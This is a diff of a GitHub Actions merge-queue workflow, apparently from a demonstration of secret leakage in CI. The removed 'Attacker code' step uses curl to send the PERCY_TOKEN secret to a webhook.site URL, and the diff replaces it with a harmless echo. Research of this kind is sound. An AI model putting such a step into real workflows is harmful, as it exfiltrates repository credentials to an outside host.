@@ -1,4 +1,4 @@
-name: Attacker-merge-queue-workflow
+name: victim-merge-queue-workflow
 
 on:
   merge_group:
@@ -7,7 +7,7 @@ jobs:
   validate-pr:
     runs-on: ubuntu-latest
     steps:
-    - name: Attacker code
-      run:  curl "https://webhook.site/ff58ef29-69c8-47ca-b4f0-779132bdad3b?foo=${{secrets.PERCY_TOKEN}}"
+    - name: victim code
+      run:  echo "helo"
     - name: Run slow CI (emulated by a long sleep)
       run: sleep 300
